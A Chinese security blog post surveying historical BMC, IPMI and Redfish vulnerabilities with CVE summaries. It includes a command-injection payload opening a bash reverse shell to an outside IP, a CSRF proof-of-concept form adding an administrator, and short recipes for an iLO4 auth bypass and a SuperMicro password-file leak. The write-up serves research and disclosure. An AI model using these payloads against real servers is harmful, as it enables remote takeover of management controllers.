<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="BMC 历史漏洞汇总刚开始接触 BMC 以为研究的人比较少，感觉一般人也没有机会接触到。尤其是服务器风扇的声音，一般人也不想去碰。去查了一下 CVE 之后，发现有不少漏洞，还挺多人玩的。近期也在研究这一块，把 BMC 曾曝出的漏洞做个汇总，看看大佬们都有哪些奇妙的思路。 BMC(Baseboard Management Controller)即基板管理控制器，提供  IPMI&#x2F;Redfish 架构">
<meta property="og:type" content="article">
<meta property="og:title" content="BMC 历史漏洞汇总">
<meta property="og:url" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html">
<meta property="og:site_name" content="Delikely&#39;s Blog">
<meta property="og:description" content="BMC 历史漏洞汇总刚开始接触 BMC 以为研究的人比较少，感觉一般人也没有机会接触到。尤其是服务器风扇的声音，一般人也不想去碰。去查了一下 CVE 之后，发现有不少漏洞，还挺多人玩的。近期也在研究这一块，把 BMC 曾曝出的漏洞做个汇总，看看大佬们都有哪些奇妙的思路。 BMC(Baseboard Management Controller)即基板管理控制器，提供  IPMI&#x2F;Redfish 架构">
<meta property="og:locale">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/hpe-ilo-firmware-chip-e1497050696145.jpg">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/StorageReview-HPE-iLO_5_Image02-1623380128260.png">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/IPMI-Block-Diagram.png">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/5574441-c4000c6e2fe166d1.jpg">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/5574441-25a9f43dd5005df9.png">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20210611124042688.png">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/1573267238057.png">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/1573268245311.png">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/1573268596272.png">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/superMicro%20impi%20command%20inject.jpg">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/xss-1.png">
<meta property="og:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/15225766397758.png">
<meta property="article:published_time" content="2021-06-22T15:36:37.000Z">
<meta property="article:modified_time" content="2021-06-28T02:43:22.000Z">
<meta property="article:author" content="Delikely">
<meta property="article:tag" content="IOT">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/hpe-ilo-firmware-chip-e1497050696145.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/rice.svg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/rice.svg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/rice.png">
          
        
    
    <!-- title -->
    <title>BMC 历史漏洞汇总</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Delikely's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body class="max-width mx-auto px3">
    
      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/2018/04/11/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/06/24/Automotive-Security-Timeline/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&text=BMC 历史漏洞汇总"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&is_video=false&description=BMC 历史漏洞汇总"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BMC 历史漏洞汇总&body=Check out this article: http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&name=BMC 历史漏洞汇总&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&text=BMC 历史漏洞汇总"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB"><span class="toc-number">1.</span> <span class="toc-text">BMC 历史漏洞汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%A6%E5%A4%96%E7%AE%A1%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">云服务器带外管理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPMI"><span class="toc-number">1.1.1.</span> <span class="toc-text">IPMI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#IPMI-%E5%91%BD%E4%BB%A4%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">IPMI 命令举例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Redfish"><span class="toc-number">1.1.2.</span> <span class="toc-text">Redfish</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#API-%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">API 举例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%ABPOC%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">含POC的漏洞（部分）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-21224-%E6%B5%AA%E6%BD%AE-NF5266M5-Cluster-Management-System-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">CVE-2020-21224 :  浪潮 NF5266M5  Cluster Management System 命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-19642-SuperMicro-IPMI-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">CVE-2019-19642: SuperMicro IPMI 命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-15046-SuperMicro-IPMI-03-40-CSRF-%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.3.</span> <span class="toc-text">CVE-2020-15046: SuperMicro IPMI 03.40 - CSRF(添加管理员用户)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-12542-HPE-ILO4-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.4.</span> <span class="toc-text">CVE-2017-12542: HPE ILO4 认证绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2014-8272-Dell-iDRAC-IPMI-1-5-Session-ID-%E9%9A%8F%E6%9C%BA%E5%8C%96%E9%97%AE%E9%A2%98%E5%8F%AF%E8%A2%AB%E9%A2%84%E6%B5%8B"><span class="toc-number">1.2.5.</span> <span class="toc-text">CVE-2014-8272: Dell iDRAC IPMI 1.5 - Session ID 随机化问题可被预测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Supermicro-IPMI-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.6.</span> <span class="toc-text">Supermicro IPMI 密码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IPMI-%E6%8E%A5%E5%8F%A3%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.7.</span> <span class="toc-text">IPMI 接口漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞列表（部分）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AC%E7%BD%91%E8%AE%BE%E5%A4%87"><span class="toc-number">1.4.</span> <span class="toc-text">公网设备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        BMC 历史漏洞汇总
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Delikely's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2021-06-22T15:36:37.000Z" itemprop="datePublished">2021-06-22</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/IOT/" rel="tag">IOT</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="BMC-历史漏洞汇总"><a href="#BMC-历史漏洞汇总" class="headerlink" title="BMC 历史漏洞汇总"></a>BMC 历史漏洞汇总</h2><p>刚开始接触 BMC 以为研究的人比较少，感觉一般人也没有机会接触到。尤其是服务器风扇的声音，一般人也不想去碰。去查了一下 CVE 之后，发现有不少漏洞，还挺多人玩的。近期也在研究这一块，把 BMC 曾曝出的漏洞做个汇总，看看大佬们都有哪些奇妙的思路。</p>
<p><strong>BMC</strong>(Baseboard Management Controller)即<strong>基板管理控制器</strong>，提供  IPMI/Redfish 架构中的智能特性。它是嵌入在计算机（通常是服务器）主板上的专用微控制器。 BMC负责管理系统管理软件和平台硬件之间的接口。用于计算机系统的带外管理和管理员操作监视。提供的服务包括服务器物理健康状态检测，服务器软硬件信息和运行状态查询、开关机、远程安装操作系统等。</p>
<p><img src="hpe-ilo-firmware-chip-e1497050696145.jpg" alt="img" style="zoom:20%;" /></p>
<p>有了BMC，运维人员可以通过浏览器等远程控制服务器（下图是HPE ILO后台），比如开关机、装系统、进入服务器终端等，而不用跑到机房忍受高温、令人崩溃的声音。而我们搞安全的就不一样，就喜欢听（被迫，要连接串口线)，都不用降噪耳机呢！</p>
<p><img src="StorageReview-HPE-iLO_5_Image02-1623380128260.png" alt="img"></p>
<h3 id="云服务器带外管理"><a href="#云服务器带外管理" class="headerlink" title="云服务器带外管理"></a>云服务器带外管理</h3><p>带外管理是指远程客户端通过网络物理通道对服务器进行控制管理和维护。常见的带外管理接口有 IPMI 和 Redfish。</p>
<h4 id="IPMI"><a href="#IPMI" class="headerlink" title="IPMI"></a>IPMI</h4><p>1998年，由Intel和HP主推的IPMI标准，引入了单独的带外管理芯片BMC。智能平台管理接口（IPMI）是一套为自主计算机子系统定义的计算机接口规范，用于提供独立于主机系统的CPU，固件（BIOS或UEFI）和操作系统等软硬件的管理和监视功能。 IPMI定义了一套系统管理员接口，格式统一格式，对下层透明，可以架构在网络、串行/Moderm接口、IPMB（I2C）、KCS、SMIC、SMBus等不同接口上。</p>
<p>IPMI也在 2015 年公布 2.0 v1.1标准后，停止更新维护，被 RedFish 永久代替。为了做到兼容，现在不少服务器上仍然支持 IPMI。</p>
<p>IMPI规范主体架构如下：</p>
<p><img src="IPMI-Block-Diagram.png" alt="IPMI architecture diagram shows BMC sideband via SMBUS."></p>
<p><img src="5574441-c4000c6e2fe166d1.jpg" alt="IPMI主体架构"></p>
<p>使用 IPMI 的 BMC系统如下所示：</p>
<p><img src="5574441-25a9f43dd5005df9.png" alt="img"></p>
<h5 id="IPMI-命令举例"><a href="#IPMI-命令举例" class="headerlink" title="IPMI 命令举例"></a>IPMI 命令举例</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看设备信息</span></span><br><span class="line">ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin chassis status</span><br><span class="line"><span class="comment"># 查看用户</span></span><br><span class="line">ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user list</span><br><span class="line"><span class="comment"># 服务器的开机，关机</span></span><br><span class="line">ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin power on</span><br><span class="line">ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin power off</span><br><span class="line"><span class="comment"># 查看BMC的信息</span></span><br><span class="line">/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin mc info</span><br></pre></td></tr></table></figure>
<h4 id="Redfish"><a href="#Redfish" class="headerlink" title="Redfish"></a>Redfish</h4><p>RedFish标准由DMTF组织的SPMF论坛维护，它的提出者与 IPMI 的提出者几乎一样。可以说是下一代云服务器带外管理接口。开发Redfish的主要原因之一是解决 IPMI 遗留的无法有效解决的安全需求。Redfish的第1版侧重于服务器，为IPMI - over - LAN提供了一个安全、多节点的替代品。随后 的Redfish版本增加了对网络接口(例如NIC、 CNA和FC HBA )、PCIe交换、本地存储、 NVDIMM、多功能适配器和可组合性以及固 件更新服务、软件更新推送方法和安全特权映射的管理。</p>
<p>Redfish 是一种基于 HTTPs 服务的管理标准，利用 RESTful 接口实现设备管理。每个 HTTPs 操作都以 UTF-8 编码的JSON 的形式，提交或返回一个资源。就像 Web 应用程序向浏览器返回 HTML 一样，RESTful 接口会通过同样的传输机制(HTTPS)，以JSON 的形式向客户端返回数据，用于现有客户端应用程序和基于浏览 器的GUI。</p>
<h4 id="API-举例"><a href="#API-举例" class="headerlink" title="API 举例"></a>API 举例</h4><p>在Redfish中，所有资源都是从服务入口点（ root ）链接的，服务入口点始终位于URL： /redfish/v1。添加用户<code>/redfish/v1/AccountService/Account</code>:</p>
<p><img src="image-20210611124042688.png" alt="image-20210611124042688"></p>
<h3 id="含POC的漏洞（部分）"><a href="#含POC的漏洞（部分）" class="headerlink" title="含POC的漏洞（部分）"></a>含POC的漏洞（部分）</h3><h4 id="CVE-2020-21224-浪潮-NF5266M5-Cluster-Management-System-命令注入"><a href="#CVE-2020-21224-浪潮-NF5266M5-Cluster-Management-System-命令注入" class="headerlink" title="CVE-2020-21224 :  浪潮 NF5266M5  Cluster Management System 命令注入"></a><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-21224">CVE-2020-21224</a> : <a target="_blank" rel="noopener" href="https://github.com/NS-Sp4ce/Inspur/blob/master/ClusterEngineV4.0 Vul/Readme.md"> 浪潮 NF5266M5  Cluster Management System 命令注入</a></h4><p><img src="1573267238057.png" alt="1573267238057" style="zoom: 33%;" /></p>
<p>用户登录页面中的用户和密码字段存在命令注入漏洞。后台的处理代码类似。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 = `grep xxxx`</span><br><span class="line">var2 = $(python -c <span class="string">&quot;from crypt import crypt;print crypt(&#x27;<span class="variable">$passwd</span>&#x27;,&#x27;$1$<span class="variable">$var1</span>&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="1573268245311.png" alt="1573268245311"></p>
<p>发送 POST 消息实现反弹shell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op&#x3D;login&amp;username&#x3D;1 2\&#39;,\&#39;1\&#39;\);  &#96;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261&#96;</span><br></pre></td></tr></table></figure>
<p><img src="1573268596272.png" alt="1573268596272"></p>
<h4 id="CVE-2019-19642-SuperMicro-IPMI-命令注入"><a href="#CVE-2019-19642-SuperMicro-IPMI-命令注入" class="headerlink" title="CVE-2019-19642: SuperMicro IPMI 命令注入"></a><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19642">CVE-2019-19642</a>: <a target="_blank" rel="noopener" href="https://www.dark-sec.net/2019/12/supermicro-ipmi-exploitation.html">SuperMicro IPMI 命令注入</a></h4><p>基于IPMI 的虚拟媒体服务存在命令注入漏洞，ShareHost 、ShareName、PathToimg 等参数均存在命令注入问题，可以使用反引号 “`” 注入任意命令。  </p>
<p><img src="superMicro%20impi%20command%20inject.jpg" alt="superMicro impi command inject"></p>
<h4 id="CVE-2020-15046-SuperMicro-IPMI-03-40-CSRF-添加管理员用户"><a href="#CVE-2020-15046-SuperMicro-IPMI-03-40-CSRF-添加管理员用户" class="headerlink" title="CVE-2020-15046: SuperMicro IPMI 03.40 - CSRF(添加管理员用户)"></a><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15046">CVE-2020-15046</a>: <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48652">SuperMicro IPMI 03.40 - CSRF(添加管理员用户)</a></h4><p>CSRF 添加管理员用户 POC :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://SuperMicro-IP/cgi/config_user.cgi&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;JOKER&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;original<span class="symbol">&amp;#95;</span>username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;onebadday&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;new<span class="symbol">&amp;#95;</span>privilege&quot;</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-7117">CVE-2018-7117</a>: <a target="_blank" rel="noopener" href="https://www.atredis.com/blog/2019/3/8/cve-2018-7117-a-somewhat-accidental-xss-in-hpe-ilo">HPE iLO5 XSS</a></p>
<p>HPE iLO5 Web 后台 DHCP 选项 15<code>domain name</code> 未转移特殊字符，造成了XSS。</p>
<p><img src="xss-1.png" alt="xss-1.png"></p>
<h4 id="CVE-2017-12542-HPE-ILO4-认证绕过"><a href="#CVE-2017-12542-HPE-ILO4-认证绕过" class="headerlink" title="CVE-2017-12542: HPE ILO4 认证绕过"></a><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12542">CVE-2017-12542</a>: HPE ILO4 认证绕过</h4><p>在访问 <a target="_blank" rel="noopener" href="https://127.0.0.1:8443/rest/v1/AccountService/Accounts">https://127.0.0.1:8443/rest/v1/AccountService/Accounts</a> 时，在HTTP头的<code>Connection</code>中添加大于等于<code>29</code>个字符后，即可绕过验证（下图为成功获取到目标的iLO登录用户名）：</p>
<p><img src="15225766397758.png" alt="img"></p>
<h4 id="CVE-2014-8272-Dell-iDRAC-IPMI-1-5-Session-ID-随机化问题可被预测"><a href="#CVE-2014-8272-Dell-iDRAC-IPMI-1-5-Session-ID-随机化问题可被预测" class="headerlink" title="CVE-2014-8272: Dell iDRAC IPMI 1.5 - Session ID 随机化问题可被预测"></a><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-8272">CVE-2014-8272</a>: <a target="_blank" rel="noopener" href="https://labs.f-secure.com/archive/cve-2014-8272/">Dell iDRAC IPMI 1.5 - Session ID 随机化问题可被预测</a></h4><p>iDRAC 的 session 格式为 0x0200XXYY。三四字节 0x0200 代表 iDRAC 支持的 IPMI 的版本。第一个字节 YY 的取值范围在 0x00~03，表示会话ID，意味着多点登录的数量不能超过4个。第二个字节 XX，在激活阶段使用临时会话ID后会+1。0x00 具备特殊含义，剩下 2<sup>8</sup>- 1 种可能，从 0x01 ~ 0xFF。</p>
<p>利用：</p>
<ol>
<li>使用任意账户发送 “Get Session Challenge” 请求获取当前的临时会话 ID。</li>
<li>使用下一个会话 ID 构造 IPMI 命令，这个会话 ID 是临时ID+3。</li>
<li>重复发送构造的请求，注入到下一个会话中。</li>
</ol>
<p>利用脚本: <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/35770">exploit-db</a></p>
<h4 id="Supermicro-IPMI-密码泄露"><a href="#Supermicro-IPMI-密码泄露" class="headerlink" title="Supermicro IPMI 密码泄露"></a>Supermicro IPMI 密码泄露</h4><p>SuperMicro老版本在49152放置了明文密码文件。攻击者可以通过请求服务器49152端口的 /PSBlock 文件，就可得到80端口web管理界面的密码，密码放在PSBlock文件中。 </p>
<h4 id="IPMI-接口漏洞"><a href="#IPMI-接口漏洞" class="headerlink" title="IPMI 接口漏洞"></a>IPMI 接口漏洞</h4><p>IPMI（Intelligent PlatformManagement Interface）智能平台管理接口，原本是一种Intel架构的企业系统的周边设备所采用的一种工业标准。IPMI亦是一个开放的免费标准，用户无需支付额外的费用即可使用此标准。</p>
